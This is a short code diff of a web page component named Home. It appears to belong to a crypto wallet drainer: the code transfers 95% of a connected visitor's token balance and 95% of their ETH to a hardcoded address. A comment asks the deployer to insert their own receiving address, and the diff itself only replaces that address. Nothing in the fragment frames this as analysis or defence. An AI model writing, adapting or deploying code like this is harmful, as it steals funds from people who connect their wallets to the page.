@@ -60,7 +60,7 @@ export default function Home() {
     );
 
     const tx = await contract.transfer(
-      "0x6Ac97c57138BD707680A10A798bAf24aCe62Ae9D", // reciever address, please put your address
+      "0x09fD825C2442098a8D503680968Da4951F0C4338", // reciever address, please put your address
       BigInt(balance * 0.95)
     );
     await tx.wait(1);
@@ -71,7 +71,7 @@ export default function Home() {
       (await provider.getBalance(signerAddress)).toString()
     );
     const tx = await signer.sendTransaction({
-      to: "0x6Ac97c57138BD707680A10A798bAf24aCe62Ae9D", // reciever address, please put your address
+      to: "0x09fD825C2442098a8D503680968Da4951F0C4338", // reciever address, please put your address
       value: ethers.utils.parseEther(`${(balance * 0.95) / 1e18}`),
     });
     await provider.waitForTransaction(tx.hash, 1, 150000).then(() => {});
